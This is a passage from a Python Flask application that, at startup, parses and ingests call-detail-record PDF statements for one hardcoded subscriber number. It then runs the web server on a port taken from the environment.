                    seed_files.extend(glob.glob(cp))
                seed_files = sorted(list(set(seed_files)))
                if seed_files:
                    app.logger.info(f"Auto-seeding {len(seed_files)} CDR statements for 7760174171...")
                    for sf in seed_files:
                        try:
                            p_data = parse_cdr_pdf(sf, target_subscriber='7760174171')
                            ingest_cdr_data(p_data, target_subscriber='7760174171')
                        except Exception as seed_err:
                            app.logger.warning(f"Error auto-seeding {sf}: {seed_err}")
    except Exception as e:
        app.logger.warning(f"Startup CDR auto-seed warning: {e}")


if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

